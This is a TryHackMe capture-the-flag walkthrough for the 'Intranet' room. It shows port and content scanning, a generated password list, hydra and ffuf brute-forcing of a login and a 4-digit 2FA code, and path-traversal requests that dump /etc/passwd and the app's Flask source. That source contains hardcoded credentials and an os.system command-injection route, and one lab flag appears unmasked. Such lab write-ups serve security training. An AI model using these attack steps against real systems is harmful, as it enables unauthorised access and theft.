<h1 align="center">Intranet</h1>
<p align="center">2025, August 28<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>479</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Welcome to the intranet!</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/3ae07dfa-7d29-40e8-9aed-2314f3707120"><br>
Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/securesolacodersintra">here </a>.<br>
  
<img width="1200px" src="https://github.com/user-attachments/assets/6eda3422-fab3-4e64-8a3d-6a3129a99354"></p>

<h2>Task 1 . Find vulnerabilities and gain root access</h2>
<p>The web application development company SecureSolaCoders has created their own intranet page. The developers are still very young and inexperienced, but they ensured their boss (Magnus) that the web application was secured appropriately. The developers said, "Don't worry, Magnus. We have learnt from our previous mistakes. It won't happen again". However, Magnus was not convinced, as they had introduced many strange vulnerabilities in their customers' applications earlier.<br>


</h6><img width="400px" src="https://github.com/user-attachments/assets/c7e021fa-bd89-405e-abb1-615422fca13d">TryHackMe</p>

Magnus hired you as a third-party to conduct a penetration test of their web application. Can you successfully exploit the app and achieve root access?<br>

Start the VM by pressing the green "Start Machine" button. Please allow the machine 3 - 5 minutes to fully boot.</p>

<br>
<p><em>Answer the questions below</em></p>
<br>

<h2 align="center">Port Scanning</h2>

<p>

- &nbsp;&nbsp;&nbsp;&nbsp;<code>7</code> &nbsp;&nbsp;&nbsp; ・ &nbsp;&nbsp; <code>echo</code><br>
- &nbsp;&nbsp;&nbsp;<code>21</code> &nbsp;&nbsp; ・ &nbsp;&nbsp; <code>FTP</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ・ &nbsp;&nbsp; vsftpd 3.0.5<br>
- &nbsp;&nbsp;&nbsp;<code>22</code> &nbsp;&nbsp; ・ &nbsp;&nbsp; <code>SSH</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ・ &nbsp;&nbsp; OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)<br>
- &nbsp;&nbsp;&nbsp;<code>23</code> &nbsp;&nbsp; ・ &nbsp;&nbsp; <code>Telnet</code><br>
- &nbsp;&nbsp;&nbsp;<code>80</code> &nbsp;&nbsp; ・ &nbsp;&nbsp; <code>HTTPS</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ・ &nbsp;&nbsp; Apache httpd 2.4.41 ((Ubuntu))<br>
- <code>8080</code> &nbsp;&nbsp; ・ &nbsp;&nbsp; <code>HTTP-PROXY</code> &nbsp;&nbsp; ・ &nbsp;&nbsp; Werkzeug/2.2.2 Python/3.8.10</p>

```bash
(rosana) :~/Intranet# nmap -sC -sV xx.xxx.x.xxx
...
PORT     STATE SERVICE    VERSION
7/tcp    open  echo
21/tcp   open  ftp        vsftpd 3.0.5
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
23/tcp   open  tcpwrapped
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
8080/tcp open  http-proxy Werkzeug/2.2.2 Python/3.8.10
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.2 Python/3.8.10
|     Date: Thu, 28 Aug 2025 xx:xx:xx GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.8.10
|     Date: Thu, 28 Aug 2025 xx:xx:xx GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 199
|     Location: /login
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.8.10
|     Date: Thu, 28 Aug 2025 xx:xx:xx GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/2.2.2 Python/3.8.10
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /login
```

<br>
<h2 align="center">Vulnerability Assessment</h2>

```bash
:~# nikto -h xx.xxx.x.xxx
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.x.xxx
+ Target Hostname:    xx.xxx.x.xxx
+ Target Port:        80
+ Start Time:         2025-10-01 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x6f 0x5ecde2421fe3a 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ 6544 items checked: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2025-10-01 xx:xx:xx (GMT1) (7 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```bash
:~/Intranet# nikto -h xx.xxx.x.xxx:8080
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.x.xxx
+ Target Hostname:    xx.xxx.x.xxx
+ Target Port:        8080
+ Start Time:         2025-10-01 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Werkzeug/2.2.2 Python/3.8.10
+ The anti-clickjacking X-Frame-Options header is not present.
+ Root page / redirects to: /login
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
+ Allowed HTTP Methods: HEAD, OPTIONS, GET 
+ 6544 items checked: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2025-10-01 xx:xx:xx (GMT1) (18 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<br>
<h2 align="center">Virtual Environment</h2>

```bash
:~/Intranet# python3 -m venv rosana
```

```bash
:~/Intranet# source rosana/bin/activate
(rosana) :~/Intranet# 
```

<h2 align="center">Static Host Mapping</h2>

```bash
xx.xxx.x.xxx intranet.thm
```

<h2 align="center">Content Discovery</h2>
<p>

- <code>intranet.thm:8080/temporary</code> > <code>intranet.thm:8080/home</code> > <code>intranet.thm:8080/login</code></p>

```bash
(rosana) :~/Intranet# gobuster dir -u http://intranet.thm:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 80
...
[http://intranet.thm:8080/home                (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/login                (Status: 200) [Size: 2154]
http://intranet.thm:8080/admin                (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/external             (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/sms                  (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/logout               (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/application          (Status: 403) [Size: 213]
http://intranet.thm:8080/internal             (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/temporary            (Status: 403) [Size: 213]](http://intranet.thm:8080/home                 (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/login                (Status: 200) [Size: 2154]
http://intranet.thm:8080/admin                (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/external             (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/sms                  (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/logout               (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/application          (Status: 403) [Size: 213]
http://intranet.thm:8080/internal             (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/temporary            (Status: 403) [Size: 213]
Progress: 218275 / 218276 (100.00%)
===============================================================
Finished
===============================================================
```

<h2 align="center">Web application</h2>

<img width="1062" height="552" alt="image" src="https://github.com/user-attachments/assets/aed4e827-9606-465d-80f1-e9cb1de5fb36" />

<br>
<p>

- for <code>usr</code> &nbsp;&nbsp; <code>E-mail</code>: type="text" placeholder="firstname@securesolacoders.no" name="username" id="username" value="" required<br>
- for <code>psw</code> &nbsp;&nbsp; <code>Password</code>: type="password" placeholder="Password" name="password" id="passworde" value="" required<br>
- method <code>POST</code><br>
- for any inquiries, contact <code>devops</code>@securesolacoders.no<br>Sincerely, <code>anders</code> (Senior Developer)</p>

<img width="1264" height="577" alt="image" src="https://github.com/user-attachments/assets/c2d2edd3-377e-472e-bb6a-3b32b42002dd" />

<br>
<h2 align="center">Login</h2>
<p>

- 200 OK, Invalid password for username= <code>anders</code>%40securesolacoders.no&password=password<br>
- 200 OK, Invalid password for username= <code>devops</code>%40securesolacoders.no&password=password<br>
- 200 OK, Invalid username for username= <code>magnus</code>%40securesolacoders.no&password=password<br>
- 200 OK, Invalid password for username= <code>admin</code>%40securesolacoders.no&password=password</p>

<h2 align="center">W.txt</h2>

```bash
anders
devops
admin
securesolacoders
password
developer
senior
```

<h2 align="center">users.txt</h2>

```bash
devops@securesolacoders.no
admin@securesolacodres.no
anders@securesolacoders.no
```

<h2 align="center">A.txt</h2>

```bash
securesolacoders
```

<h2 align="center">B.txt</h2>

```bash
:~/Intranet# john --wordlist:A.txt -rules:jumbo -stdout > B.txt
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
70539p 0:00:00:00 100.00% (2025-10-01 13:54) 641263p/s sesola
```

```bash
:~/Intranet# head -n 14 B.txt
securesolacoders
Securesolacoders
secure
secures
secur
securesolacoderssecuresolacoders
Sredocaloseruces
Securesolacoderssecuresolacoders
SECURESOLACODERS
sredocaloseruces
securesolacoderses
Securesolacoderses
SecuresolacodersSecuresolacoders
secu
```

```bash
:~/Intranet# sed -i 's/[^a-zA-Z0-9]//g' B.txt
```

<h2 align="center">Hydra</h2>

<p>

- <code>anders@securesolacoders.no</code> : <code>securesolarcoders2022</code></p>

```bash
(rosana) :~/Intranet# hydra -L users.txt -P B.txt -s 8080 xx.xxx.x.xxx http-post-form "/login:username=^USER^&password=^PASS^:Error:" -t 50
...
[DATA] max 50 tasks per 1 server, overall 50 tasks, 108588 login tries (l:1/p:108588), ~2172 tries per task
[DATA] attacking http-post-form://xx.xxx.x.xxx:8080/login:username=^USER^&password=^PASS^:Error:
[8080][http-post-form] host: xx.xxx.x.xxx  login: anders@securesolacoders.no   password: securesolarcoders2022
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-28 xx:xx:xx
```

```bash
(rosana) :~/Intranet# hydra -l anders@securesolacoders.no -P B.txt -s 8080 xx.xxx.x.xxx http-post-form "/login:username=^USER^&password=^PASS^:Error:"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-01 16:42:45
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 70539 login tries (l:1/p:70539), ~4409 tries per task
[DATA] attacking http-post-form://10.201.0.156:8080/login:username=^USER^&password=^PASS^:Error:
[8080][http-post-form] host: 10.201.0.156   login: anders@securesolacoders.no   password: securesolacoders2022
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-01 16:43:08
```

<h2 align="center">Login</h2>
<p>
  
- Launched Burp Suite<br>
- Enabled Foxy Proxy</p>

<img width="1268" height="490" alt="image" src="https://github.com/user-attachments/assets/910b075d-a69a-44ec-abe3-c27ba51323ab" />

<br>
<br>
<h6>Request</h6>

```bash
POST /login HTTP/1.1
Host: intranet.thm:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Origin: http://intranet.thm:8080
Connection: keep-alive
Referer: http://intranet.thm:8080/login
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=anders%40securesolacoders.no&password=********************
```

<h6>Response</h6>

```bash
HTTP/1.1 302 FOUND
Server: Werkzeug/2.2.2 Python/3.8.10
Date: Thu, 28 Aug 2025 xx:xx:xx GMT
Content-Type: text/html; charset=utf-8
Content-Length: 195
Location: /sms
Vary: Cookie
Set-Cookie: session=eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aN1MYA.HDa-Uv0gKSf_NwlCtudBSQmcIss; HttpOnly; Path=/
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/sms">/sms</a>. If not, click the link.
```

<h2 align="center">sms</h2>
<p>

- Web Application first flag<br>
- <code>2FA</code> code has been sent to <code>+47 *****299</code></p>

<h6>Request</h6>

```bash
GET /sms HTTP/1.1
Host: intranet.thm:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://intranet.thm:8080/login
Connection: keep-alive
Cookie: session=eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aN1MYA.HDa-Uv0gKSf_NwlCtudBSQmcIss
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

<h6>Response</h6>

```bash
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.8.10
Date: Thu, 28 Aug 2025 xx:xx:xx GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1255
Vary: Cookie
Connection: close

<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
...

<div class="container">
<form action="" method="POST">
    <h2>2FA code has been sent to +47 *****299</h2>
    <h3>Flag: THM{*******************************}</h3>
    <hr>
...
```

<h2 align="center">Wordlist</h2>

```bash
for i in {0000..9999}; do echo "$i"; done > support
```

```bash
(rosana) :~/Intranet# tail -n 2 support
9998
9999
```

<h2 align="center">ffuf</h2>

```bash
:~/Intranet# ffuf -u http://intranet.thm:8080/sms -c -w support -d 'sms=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -b 'session=eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aN1MYA.HDa-Uv0gKSf_NwlCtudBSQmcIss' -fc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://intranet.thm:8080/sms
 :: Wordlist         : FUZZ: support
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: session=eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aN1MYA.HDa-Uv0gKSf_NwlCtudBSQmcIss
 :: Data             : sms=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 200
________________________________________________

8929                    [Status: 302, Size: 197, Words: 18, Lines: 6]
:: Progress: [10000/10000] :: Job [1/1] :: 514 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
```

<br>
<br>
<br>

<img width="1059" height="292" alt="image" src="https://github.com/user-attachments/assets/fc872773-b683-485e-89f0-6e3f7a7a83a6" />

<br>
<br>
<p>

- Logged in from xx.xxx.xx.xxx, and there is <code>Logged in from source **.***.**.***</code></p>

<img width="1060" height="410" alt="image" src="https://github.com/user-attachments/assets/7cd44025-c3c2-4ecc-981a-8124998b9f2f" />


<br>
<br>
<br>

<br>
<br>

<p>1.1. What is the first web application flag? Hint : <em>Think about the information you have gathered so far from the web application - usernames, company name, etc. You might want to generate a password list or make educated guesses</em>.<br>
<code>THM{*******************************}</code></p>

<p>

- Web Application second flag<br>
- source ip xx.xxx.xxx.xxx<br>
- support@securesolacoders.no</p>

<img width="1263" height="350" alt="image" src="https://github.com/user-attachments/assets/fa608811-307e-4c30-b38b-85417d545538" />

<br>
<br>
<p>1.2. What is the second web application flag? Hint : <em>Research common techniques to bypass this security mechanism</em>.<br>
<code>THM{********************************}</code></p>

<br>
<h2 align="center">Internal News</h2>
<p>

- Update news feed : <code>Update</code>
- internal@securesolacoders.co<br>
- hiring@securesolacoders.co</p>

<br>
<br>
<h6>Request</h6>

```bash
POST /internal HTTP/1.1
Host: intranet.thm:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://intranet.thm:8080
Connection: keep-alive
Referer: http://intranet.thm:8080/internal
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kZXJzIn0.aN1NTg.wj8ABWJCK5uSDPyexxkuF718-94
Upgrade-Insecure-Requests: 1
Priority: u=0, i

news=latest
```

<h6>Response</h6>

```bash
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.8.10
Date: Wed, 01 Oct 2025 15:53:46 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1684
Vary: Cookie
Connection: close


<!DOCTYPE html>
...
 <li><a href="/external">External News</a></li>
  <li><a href="/admin">Admin</a></li>
  <li><a href="/logout">Log Out</a></li>
...
Any cool news we should know about? Contact us!</p>
  <p>internal@securesolacoders.no</p><br>

<form action="/internal" method="POST">
    <h4>Update news feed</h4>
    <button type="submit" name="news" id="news" value="latest">Update</button>
  
</form>
    
    
      No more news today!
Please check again later.
```

<br>
<br>
<br>

<br>
<br>
<h6>Request</h6>

```bash
POST /internal HTTP/1.1
Host: intranet.thm:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://intranet.thm:8080
Connection: keep-alive
Referer: http://intranet.thm:8080/internal
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kZXJzIn0.aN1NTg.wj8ABWJCK5uSDPyexxkuF718-94
Upgrade-Insecure-Requests: 1
Priority: u=0, i

news=../../../etc/passwd
```

<h6>Response</h6>

```bash
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.8.10
Date: Wed, 01 Oct 2025 15:56:27 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3742
Vary: Cookie
Connection: close


<!DOCTYPE html>
...
<form action="/internal" method="POST">
    <h4>Update news feed</h4>
    <button type="submit" name="news" id="news" value="latest">Update</button>
  
</form>
    
    
      root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
anders:x:1000:1000:anders:/home/anders:/bin/bash
devops:x:1001:1001:,,,:/home/devops:/bin/bash
telnetd:x:113:118::/nonexistent:/usr/sbin/nologin
ftp:x:114:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:115:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
ubuntu:x:1002:1003:Ubuntu:/home/ubuntu:/bin/bash

    
    </div>

</body>
</html>
```




<br>
<br>
<h6>Request</h6>

```bash
POST /internal HTTP/1.1
Host: intranet.thm:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://intranet.thm:8080
Connection: keep-alive
Referer: http://intranet.thm:8080/internal
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kZXJzIn0.aN1NTg.wj8ABWJCK5uSDPyexxkuF718-94
Upgrade-Insecure-Requests: 1
Priority: u=0, i

news=../../../home/devops/app.py
```

<h6>Response</h6>

```bash
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.8.10
Date: Wed, 01 Oct 2025 15:56:27 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3742
Vary: Cookie
Connection: close


<!DOCTYPE html>
...
</form>
    
    
      from flask import Flask, flash, redirect, render_template, request, session, abort, make_response, render_template_string, send_file
from time import gmtime, strftime
import jinja2, os, hashlib, random

app = Flask(__name__, template_folder=&#34;/home/devops/templates&#34;)


###############################################
# Flag: THM{4ccacfd73710ac18b4ac15646b32380a} #
###############################################


key = &#34;secret_key_&#34; + str(random.randrange(100000,999999))
app.secret_key = str(key).encode()

def check_hacking_attempt(value):

        bad_chars = &#34;#&amp;;&#39;\&#34;&#34;
        error = &#34;&#34;

        if any(ch in bad_chars for ch in value):
                error = &#34;Hacking attempt detected! &#34;
                error += &#34;You have been logged as &#34;
                error += request.remote_addr
                return True, error

        else:
                return False, error


@app.route(&#34;/robots.txt&#34;, methods=[&#34;GET&#34;])
def robots():
        return &#34;&lt;!-- Try harder --!&gt;&#34;



@app.route(&#34;/&#34;, methods=[&#34;GET&#34;])
def root():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                return redirect(&#34;/home&#34;)


@app.route(&#34;/application&#34;, methods=[&#34;GET&#34;])
def application():
        return abort(403)


@app.route(&#34;/application/console&#34;, methods=[&#34;GET&#34;])
def console():
        return abort(403)


@app.route(&#34;/temporary&#34;, methods=[&#34;GET&#34;])
def temporary():
    return abort(403)


@app.route(&#34;/temporary/dev&#34;, methods=[&#34;GET&#34;])
def dev():
        return abort(403)


@app.route(&#34;/login&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;])
def login():

        if session.get(&#34;logged_in&#34;):
                return redirect(&#34;/home&#34;)

        if request.method == &#34;POST&#34;:

                username = request.form[&#34;username&#34;]
                attempt, error = check_hacking_attempt(username)
                if attempt == True:
                        error += &#34;. (Detected illegal chars in username).&#34;
                        return render_template(&#34;login.html&#34;, error=error)

                password = request.form[&#34;password&#34;]
                attempt, error = check_hacking_attempt(password)
                if attempt == True:
                        error += &#34;. (Detected illegal chars in password).&#34;
                        return render_template(&#34;login.html&#34;, error=error)


                if username.lower() == &#34;admin@securesolacoders.no&#34;:
                        error = &#34;Invalid password&#34;
                        return render_template(&#34;login.html&#34;, error=error)


                if username.lower() == &#34;devops@securesolacoders.no&#34;:
                        error = &#34;Invalid password&#34;
                        return render_template(&#34;login.html&#34;, error=error)


                if username.lower() == &#34;anders@securesolacoders.no&#34;:
                        if password == &#34;securesolacoders2022&#34;:
                                session[&#34;username&#34;] = &#34;anders&#34;

                                global sms_code
                                sms_code = random.randrange(1000,9999)

                                return redirect(&#34;/sms&#34;)
                        
                        else:
                                error = &#34;Invalid password&#34;
                                return render_template(&#34;login.html&#34;, error=error)
                else:
                        error = &#34;Invalid username&#34;
                        return render_template(&#34;login.html&#34;, error=error)

        return render_template(&#34;login.html&#34;)



@app.route(&#34;/sms&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;])
def sms():

        if session.get(&#34;username&#34;):
                if request.method == &#34;POST&#34;:
                        sms = request.form[&#34;sms&#34;]

                        if sms == str(sms_code):
                                session[&#34;logged_in&#34;] = True
                                return redirect(&#34;/home&#34;)
                        else:
                                error = &#34;Invalid SMS code&#34;
                                return render_template(&#34;sms.html&#34;, error=error) 


                return render_template(&#34;sms.html&#34;)
        else:
                return redirect(&#34;/login&#34;)



@app.route(&#34;/logout&#34;, methods=[&#34;GET&#34;])
def logout():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                session.clear()
                return redirect(&#34;/login&#34;)


@app.route(&#34;/home&#34;, methods=[&#34;GET&#34;])
def home():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                current_ip = request.remote_addr

                templateLoader = jinja2.FileSystemLoader(searchpath=&#34;./templates/&#34;)
                templateEnv = jinja2.Environment(loader=templateLoader)
                t = templateEnv.get_template(&#34;home.html&#34;)
                return t.render(current_ip=current_ip)


@app.route(&#34;/admin&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;])
def admin():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                if session.get(&#34;username&#34;) == &#34;admin&#34;:

                        if request.method == &#34;POST&#34;:
                                os.system(request.form[&#34;debug&#34;])
                                return render_template(&#34;admin.html&#34;)

                        current_ip = request.remote_addr
                        current_time = strftime(&#34;%Y-%m-%d %H:%M:%S&#34;, gmtime())

                        return render_template(&#34;admin.html&#34;, current_ip=current_ip, current_time=current_time)
                else:
                        return abort(403)


@app.route(&#34;/internal&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;])
def internal():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                if request.method == &#34;POST&#34;:
                        news_file = request.form[&#34;news&#34;]
                        news = open(&#34;/opt/news/{}&#34;.format(news_file)).read()
                        return render_template(&#34;internal.html&#34;, news=news)

                return render_template(&#34;internal.html&#34;)


@app.route(&#34;/external&#34;, methods=[&#34;GET&#34;])
def external():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                templateLoader = jinja2.FileSystemLoader(searchpath=&#34;./templates/&#34;)
                templateEnv = jinja2.Environment(loader=templateLoader)
                t = templateEnv.get_template(&#34;external.html&#34;)
                return t.render()


if __name__ == &#34;__main__&#34;:
        app.run(host=&#34;0.0.0.0&#34;, port=8080, debug=False)


    
    </div>

</body>
</html>
